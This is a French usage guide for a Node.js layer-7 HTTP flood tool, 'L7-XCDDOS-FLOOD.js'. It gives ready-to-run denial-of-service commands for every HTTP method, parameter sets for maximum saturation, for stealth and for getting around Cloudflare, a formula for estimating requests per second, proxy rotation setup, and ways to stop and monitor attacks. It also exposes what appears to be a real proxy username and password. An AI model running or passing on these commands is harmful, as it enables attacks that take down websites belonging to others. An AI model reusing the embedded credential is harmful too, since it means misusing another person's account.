# Guide d'utilisation - L7-XCDDOS-FLOOD.js

## 📋 Format du fichier proxy

### Fichier : `proxies.txt`

**Format supporté :** `user:pass@ip:port`

**Exemple avec vos credentials :**
```
fa6woTeBNjLAF6En:PjukuUhi8DLXx848_country-fr@geo.iproyal.com:12321
```

**Note :** Vous pouvez ajouter plusieurs proxies (un par ligne) pour la rotation.

---

## 🚀 Commandes pour toutes les méthodes HTTP

### Syntaxe générale :
```bash
node L7-XCDDOS-FLOOD.js <host> <time> <req> <thread> <proxy.txt> <data>
```

**Paramètres :**
- `host` : URL complète (https://example.com)
- `time` : Durée en secondes
- `req` : Nombre de requêtes par interval (500ms)
- `thread` : Nombre de workers (recommandé : nombre de CPU cores)
- `proxy.txt` : Fichier contenant les proxies
- `data` : Méthode HTTP (GET, POST, HEAD, etc.)

---

## 📝 Commandes par méthode HTTP

### 1. **GET Attack** (Méthode la plus courante)
```bash
node L7-XCDDOS-FLOOD.js https://example.com 60 1000 50 proxies.txt GET
```

### 2. **POST Attack**
```bash
node L7-XCDDOS-FLOOD.js https://example.com 60 1000 50 proxies.txt POST
```

### 3. **HEAD Attack** (Léger, pas de body)
```bash
node L7-XCDDOS-FLOOD.js https://example.com 60 1000 50 proxies.txt HEAD
```

### 4. **OPTIONS Attack**
```bash
node L7-XCDDOS-FLOOD.js https://example.com 60 1000 50 proxies.txt OPTIONS
```

### 5. **PUT Attack**
```bash
node L7-XCDDOS-FLOOD.js https://example.com 60 1000 50 proxies.txt PUT
```

### 6. **DELETE Attack**
```bash
node L7-XCDDOS-FLOOD.js https://example.com 60 1000 50 proxies.txt DELETE
```

### 7. **PATCH Attack**
```bash
node L7-XCDDOS-FLOOD.js https://example.com 60 1000 50 proxies.txt PATCH
```

### 8. **TRACE Attack**
```bash
node L7-XCDDOS-FLOOD.js https://example.com 60 1000 50 proxies.txt TRACE
```

### 9. **CONNECT Attack**
```bash
node L7-XCDDOS-FLOOD.js https://example.com 60 1000 50 proxies.txt CONNECT
```

---

## ⚙️ Exemples avec différents paramètres

### Attaque courte et intense (30 secondes, 2000 req/interval, 100 threads)
```bash
node L7-XCDDOS-FLOOD.js https://target.com 30 2000 100 proxies.txt GET
```

### Attaque longue et modérée (300 secondes, 500 req/interval, 25 threads)
```bash
node L7-XCDDOS-FLOOD.js https://target.com 300 500 25 proxies.txt GET
```

### Attaque maximale (60 secondes, 5000 req/interval, 200 threads)
```bash
node L7-XCDDOS-FLOOD.js https://target.com 60 5000 200 proxies.txt GET
```

### Attaque légère (120 secondes, 200 req/interval, 10 threads)
```bash
node L7-XCDDOS-FLOOD.js https://target.com 120 200 10 proxies.txt HEAD
```

---

## 📊 Calcul de la puissance

**Formule :** `RPS = (req / 0.5) * threads`

**Exemples :**
- `1000 req, 50 threads` = `(1000 / 0.5) * 50` = **100,000 RPS**
- `2000 req, 100 threads` = `(2000 / 0.5) * 100` = **400,000 RPS**
- `500 req, 25 threads` = `(500 / 0.5) * 25` = **25,000 RPS**

---

## 🎯 Recommandations par scénario

### Pour contourner Cloudflare :
```bash
node L7-XCDDOS-FLOOD.js https://target.com 60 1000 50 proxies.txt GET
```

### Pour attaque rapide et discrète :
```bash
node L7-XCDDOS-FLOOD.js https://target.com 30 500 20 proxies.txt HEAD
```

### Pour saturation maximale :
```bash
node L7-XCDDOS-FLOOD.js https://target.com 120 3000 100 proxies.txt GET
```

### Pour test de charge :
```bash
node L7-XCDDOS-FLOOD.js https://target.com 60 200 10 proxies.txt GET
```

---

## 📁 Structure des fichiers

```
/opt/discord.cool/
├── L7-XCDDOS-FLOOD.js    # Script principal
├── proxies.txt            # Fichier de proxies (à créer)
└── node_modules/          # Dépendances (après npm install)
```

---

## 🔧 Création du fichier proxy

```bash
cd /opt/discord.cool
cat > proxies.txt << 'EOF'
fa6woTeBNjLAF6En:PjukuUhi8DLXx848_country-fr@geo.iproyal.com:12321
EOF
```

**Ou avec nano/vim :**
```bash
nano proxies.txt
# Coller : fa6woTeBNjLAF6En:PjukuUhi8DLXx848_country-fr@geo.iproyal.com:12321
```

---

## ⚠️ Notes importantes

1. **Proxy unique** : Si vous n'avez qu'un proxy, mettez-le plusieurs fois dans le fichier pour la rotation
2. **Threads** : Ne dépassez pas le nombre de CPU cores disponibles
3. **Rate** : Commencez avec des valeurs modérées (500-1000) et augmentez progressivement
4. **Time** : Durée en secondes (60 = 1 minute, 3600 = 1 heure)

---

## 🛑 Arrêter une attaque

```bash
# Trouver le processus
ps aux | grep "L7-XCDDOS-FLOOD"

# Tuer tous les processus Node.js de l'attaque
pkill -f "L7-XCDDOS-FLOOD"

# Ou tuer tous les processus Node.js
pkill node
```

---

## 📈 Monitoring

```bash
# Voir les processus actifs
ps aux | grep node

# Voir les connexions réseau
netstat -tun | grep ESTABLISHED | wc -l

# Monitoring CPU/Mémoire
top -p $(pgrep -f "L7-XCDDOS-FLOOD" | tr '\n' ',' | sed 's/,$//')
```

